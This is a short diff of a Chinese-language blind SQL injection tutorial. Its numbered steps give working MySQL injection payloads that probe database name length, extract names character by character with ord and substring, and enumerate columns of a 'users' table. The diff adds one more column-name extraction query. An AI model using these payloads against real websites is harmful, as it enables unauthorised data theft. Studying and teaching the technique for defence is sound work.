@@ -66,7 +66,6 @@ user()查看当前用户
 and (select length (database())) = '8'
 ```
 
-
 3. 获取数据库名称
 and (select ord(substring(database(),1,1))) = 97
 
@@ -91,7 +90,7 @@ SELECT  COUNT(column_name) from information_schema.columns where table_name='use
 SELECT length(column_name) from information_schema.columns where table_name='users' LIMIT 0,1
 ```
 7. 获取字段名称
-
+select ord(SUBSTR((SELECT(COLUMN_NAME) from information_schema.columns where table_name='users' LIMIT 0,1),3,1))
 8. 获取数据
 
 
